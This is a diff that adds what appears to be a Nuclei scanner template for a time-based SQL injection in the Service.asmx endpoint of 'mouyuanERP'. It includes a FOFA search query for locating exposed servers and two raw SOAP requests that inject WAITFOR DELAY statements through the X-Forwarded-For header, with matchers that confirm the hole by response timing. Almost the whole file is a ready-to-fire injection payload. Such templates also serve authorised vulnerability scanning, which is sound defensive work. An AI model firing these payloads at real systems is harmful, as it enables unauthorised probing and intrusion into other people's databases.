@@ -1,0 +1,54 @@
+id: mouyuanERP-Service-asmx-X-Forwarded-For-SQL
+
+info:
+  name: mouyuanERP-Service-asmx-X-Forwarded-For-SQL
+  author: HuanXiong
+  severity: high
+  description: mouyuanERP-Service-asmx-X-Forwarded-For-SQL
+  tags: SQL
+  metadata:
+    fofa-qeury: body="/_common/scripts/md5-min.js"
+
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /Kfxt/Service.asmx HTTP/1.1
+        Host: 
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: length
+        X-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:4'--
+        SOAPAction: "http://www.mysoft.com.cn/queryProjects"
+ 
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <queryProjects xmlns="http://www.mysoft.com.cn/">
+              <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
+            </queryProjects>
+          </soap:Body>
+        </soap:Envelope>
+      - |
+        POST /Kfxt/Service.asmx HTTP/1.1
+        Host: 
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: length
+        X-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:8'--
+        SOAPAction: "http://www.mysoft.com.cn/queryProjects"
+ 
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <queryProjects xmlns="http://www.mysoft.com.cn/">
+              <inpXML>&lt;xml&gt;&lt;buname&gt;abc&lt;/buname&gt;&lt;/xml&gt;</inpXML>
+            </queryProjects>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
